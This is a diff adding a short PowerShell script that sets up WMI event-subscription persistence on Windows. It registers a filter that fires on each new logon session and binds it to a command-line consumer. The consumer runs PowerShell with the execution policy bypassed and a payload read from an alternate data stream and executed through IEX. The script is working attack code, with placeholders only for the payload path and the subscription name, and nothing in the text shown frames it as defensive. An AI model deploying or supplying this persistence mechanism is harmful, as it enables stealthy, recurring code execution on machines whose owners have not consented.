@@ -1,0 +1,20 @@
+$payload = "Get-Content Payload_path:(ADS) | IEX"
+$FilterArgs = @{
+    Name            = "WMI ES NAME"
+    EventNamespace  = 'root\CimV2'
+    QueryLanguage   = 'WQL'
+    Query           = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
+}
+$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs
+
+$ConsumerArgs = @{
+    Name                = "WMI ES NAME"
+    CommandLineTemplate = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"$Payload`""
+}
+$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
+
+$BindingArgs = @{
+    Filter   = $Filter
+    Consumer = $Consumer
+}
+Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
